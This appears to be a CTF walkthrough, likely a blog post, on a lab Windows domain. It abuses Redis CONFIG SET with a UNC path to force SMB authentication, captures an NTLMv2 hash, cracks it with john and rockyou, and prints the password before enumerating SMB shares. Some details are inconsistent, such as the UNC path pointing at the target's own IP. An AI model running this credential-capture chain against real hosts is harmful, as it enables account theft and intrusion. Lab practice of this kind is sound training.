
## LLMNR poisoning

In the CEH course I learned about LLMNR poisoning, which I found inspiring; I also read that it can appear on practical exams, so I considered testing it in this CTF to gain hands‑on experience.

**LLMNR** is a protocol that allows both IPv4 and IPv6 hosts to perform name resolution for hosts on the same local network without requiring a DNS server or DNS configuration.

When a host’s DNS query fails (i.e., the DNS server doesn’t know the name), the host broadcasts an LLMNR request on the local network to see if any other host can answer.

LLMNR is the successor to NetBIOS. **NetBIOS** (Network Basic Input/Output System) is an older protocol that was heavily used in early versions of Windows networking.

## Redis

### Redis enumeration

Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message broker. (HackTricks)

If you have little experience with Redis service, HackTricks got you covered. It has an article with full pentesting methodology.

The `redis-cli` can be used to connect to the Redis service, after which Redis can be instructed to download a file from an attacker‑controlled host. The file on the attacker system need not actually exist; the objective is merely to provoke the victim into issuing an LLMNR request.
```
redis-cli -h 10.114.133.143 
CONFIG SET dir \\10.114.133.143\fake\fake.txt  
CONFIG SET dbfilename test.rdb  
Save
```

Tools like NetExec or LdapSearch enumerate the LDAP service via TCP port 389, not UDP. That’s why we can’t get much information.

**Pro-Tip:** If you ever accidentally hit Ctrl+Z, you can type fg to bring the process back to the foreground so you can kill it properly with Ctrl+C.

[!] Error starting UDP server on port 53, check permissions or other servers running.
[!] Error starting TCP server on port 53, check permissions or other servers running.
[SMB] NTLMv2-SSP Client   : 10.114.133.143
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:b23b7254816cb301:8A07E58FE0D533537ACA96252C163699:0101000000000000005AF4D9B5ACDC01347154C36D65A6910000000002000800300050003200430001001E00570049004E002D003300440044004B004F0052005300310048003800380004003400570049004E002D003300440044004B004F005200530031004800380038002E0030005000320043002E004C004F00430041004C000300140030005000320043002E004C004F00430041004C000500140030005000320043002E004C004F00430041004C0007000800005AF4D9B5ACDC010600040002000000080030003000000000000000000000000030000086CA81B99545D25AD36CBD02A739762413E5874D7DC3A6ECC4A23B7580EEE70A0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E003100350038002E00390033000000000000000000


john enterprise_security --wordlist=/usr/share/wordlists/rockyou.txt

sand_0873959498  (enterprise-security)

## Discovering writable SMB share, overwriting scheduled script, getting initial access & user flag

Bingo, we have our first pair of credentials! We can immediately validate them with NetExec and try to access the SMB shares.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*x8gADgJxTeHDvGDv_wcfww.png)

Now that we have our first valid credentials, a lot of doors open to us in the domain. We can enumerate all the services again and see what new things we find. Using NetExec, we can also enumerate all domain users via SMB. Beside all the default accounts, we now know of 2 other users “jack-goldenhand” and “tony-skid”.

![](https://miro.medium.com/v2/resize:fit:700/1*Flr6s3qSMaz3UUb_HQcTbg.png)

We can check all the available shares using “smbclient”. Once we reach the “Enterprise-Share”, we can see a Powershell script. If we can, we should download it and look at it.